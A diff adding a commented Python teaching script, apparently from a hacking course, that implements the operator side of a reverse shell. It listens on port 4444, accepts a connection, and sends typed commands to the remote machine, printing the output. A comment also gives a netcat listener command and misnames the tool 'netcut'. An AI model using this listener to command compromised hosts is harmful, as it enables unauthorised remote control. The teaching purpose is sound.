@@ -1,0 +1,58 @@
+
+# To open a port and listen. we will use a tool called netcut
+#  use the following command: nc -vv -l -p 4444
+
+import socket
+
+# Creating a socket object
+
+# socket.AF_INET: this specifies that the socket will use IPV4 addresses.
+
+# socket.SOCK_STREAM: this specifies the type of socket, in this case, a stream socket,
+# which is used for TCP connections. TCP is a connection-oriented protocol
+# meaning it ensures reliable communication between sender and receiver.
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# This line a socket option to allow the address to be reused. Let's break it down:
+# socket.SOL_SOCKET: this tells socket module that you're setting a socket-level option
+# (as opposed to a protocol-level option like IPPROTO_TCP)
+
+# socket.SO_REUSEADDR: this option allows the socket to reuse a local address, even if it's
+# in the TIME_WAIT state (i.e previsouly used by another process). This can helpful when you're
+# restarting a server that was using the same port, and you want to avoid waiting for the operating
+#  system to release the port after it has been closed.
+
+# 1: this enables the option (it's like saying "yes, I want to reuse the address")
+
+#  So, This option is maily used to ensure that when the server is restarted, the port can be 
+#  bound to immediately rather than waiting for the operating system to clean up after
+#  a previous connection.
+
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Binding our socket to the computer so that will can listent on that port
+listener.bind(("192.168.60.2", 4444))
+
+# The listen() method enables the server to accept connections.
+
+#  0: This is the backlog value, which indicates the number of incoming connection requests
+#  that can be queued while waiting for your application to accept them. A value of 0
+#  technically means no backlog, which is often fine for simple or testing scenarios
+#  (though typically, you'd use a positive numbers like 5 to allow some queuing). if the
+#  backlog is full, incoming connections will be refused or rejected.
+
+listener.listen(0)
+
+print("[+] Waiting for incoming connections")
+
+connection, address = listener.accept()
+
+print(f"[+] Got a connection from {str(address)}")
+
+while True:
+    cmd = input("Enter cmd >> ")
+    connection.send(cmd.encode())
+    if cmd == "exit":
+        break
+    result = connection.recv(1024).decode().strip()
+    print(result)
